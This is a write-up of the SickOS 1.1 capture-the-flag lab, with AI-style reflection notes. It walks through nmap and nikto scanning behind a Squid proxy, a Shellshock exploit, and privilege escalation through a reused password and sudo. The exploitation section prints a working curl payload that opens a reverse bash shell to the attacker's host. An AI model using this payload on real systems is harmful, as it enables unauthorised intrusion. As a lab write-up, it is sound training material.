# SickOS: 1.1

The challenge describes the steps I've taken to gain root access to the target machine, and  techniques used to exploit vulnerabilities and escalate privileges.

## Action plan:

1. **Identify the initial reconnaissance steps:** finding the target IP and performing initial scans.
2. **Summarize the vulnerability discovery:** identifying the use of a proxy and the presence of a vulnerable web application.
3. **Explain the exploitation process:** detailing the Shellshock exploit and how it was used to gain a reverse shell.
4. **Describe the privilege escalation:** finding database credentials, logging in via SSH, and leveraging sudo permissions to gain root access.
5. **Highlight the final step:** Retrieving the flag from the root directory.

# Challenge Analysis: SickOS 1.1

## 1. Initial Reconnaissance

-   **Finding the Target:** The attacker used `netstat` to identify the target machine's IP address on the network, which was found to be 192.168.1.9.

-   **Port Scanning and Service Detection:** An `nmap` scan was performed to identify open ports and running services. The scan revealed:
    -   Port 22: OpenSSH 5.9p1
    -   Port 3128: Squid HTTP Proxy 3.1.19
    -   Port 8080: Closed (likely due to the proxy)

    <reflection>
    The `nmap` scan is a standard and effective way to gather information about a target.
    </reflection>

## 2. Vulnerability Discovery

-   **Proxy Detection:** The presence of a Squid HTTP Proxy on port 3128 suggested a web server might be hidden behind it.

    <reflection>
    Based on my understanding of network configurations.
    </reflection>

-   **Website and Vulnerability Scan:** `nikto` was used with the `-useproxy` option to scan the web server behind the proxy. The scan revealed:
    -   The web server was running Apache/2.2.22.
    -   The server was vulnerable to Shellshock (CVE-2014-6271 and CVE-2014-6278) in the `/cgi-bin/status` directory.

    <reflection>
    The identification of Shellshock as a potential vulnerability is crucial.
    </reflection>

-   **Website Access:** The attacker configured their Firefox browser to use the identified proxy (192.168.1.9:3128) and successfully accessed the website hosted on the target machine.
    
-   **robots.txt Discovery:** Accessing `robots.txt` revealed a disallowed directory: `/wolfcms`.

    <reflection>
    Checking `robots.txt` is a standard web application reconnaissance technique.
    </reflection>

## 3. Exploitation

-   **Shellshock Explanation:** The challenge provides a detailed explanation of the Shellshock vulnerability and how it allows for arbitrary command execution.
    
-   **Reverse Shell Setup:** A `netcat` listener was set up on the attacker's machine to receive a reverse shell connection.
    
-   **Exploiting Shellshock:** The attacker used `curl` to send a crafted HTTP request with a malicious User-Agent header, exploiting the Shellshock vulnerability in `/cgi-bin/status`. The command executed a reverse TCP bash shell back to the attacker's machine.
    
    ```zsh
    curl -x http://192.168.1.9:3128 -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.1.7/1234 0>&1" http://192.168.1.9/cgi-bin/status
    ```

-   **Gaining a Shell:** The `netcat` listener successfully received a connection, granting the attacker a shell as the `www-data` user.

    <reflection>
    This confirms the successful exploitation of the vulnerability.
    </reflection>

## 4. Privilege Escalation

-   **Database Credentials:** The attacker navigated to the `/var/www/wolfcms` directory and found the `config.php` file, which contained the MySQL root credentials:
    -   Username: `root`
    -   Password: `john@123`

    <reflection>
    Finding database credentials in a configuration file is a common privilege escalation technique.
    </reflection>

-   **Failed MySQL Connection:** The attacker attempted to connect to the MySQL server using these credentials but failed.

    <reflection>
    This is an interesting observation. It's possible that MySQL was configured to only accept connections from specific users or IP addresses, or that the service was not running.
    </reflection>

-   **User Enumeration:** The attacker examined the `/etc/passwd` file and identified a user named `sickos`.

    <reflection>
    Examining `/etc/passwd` is a standard way to enumerate users on a Linux system.
    </reflection>

-   **SSH Login:** The attacker attempted to login via SSH using the username `sickos` and the previously found MySQL root password (`john@123`). This was successful.

    <reflection>
    This highlights the danger of password reuse.
    </reflection>

-   **Sudo Permissions:** The attacker used `sudo -l` to check the `sickos` user's sudo permissions and found that the user could run any command as root.

    <reflection>
    This is a significant finding and a clear path to root access.
    </reflection>

-   **Gaining Root:** The attacker used `sudo su` to elevate their privileges to root.

    <reflection>
    This is the final step in gaining complete control over the system.
    </reflection>

## 5. Flag Capture

-   **Retrieving the Flag:** The attacker navigated to the `/root` directory and used `cat` to read the contents of the flag file `a0216ea4d51874464078c618298b1367.txt`, successfully completing the CTF challenge.

    <reflection>
    This is the objective of the CTF and confirms the successful compromise of the target machine.
    </reflection>

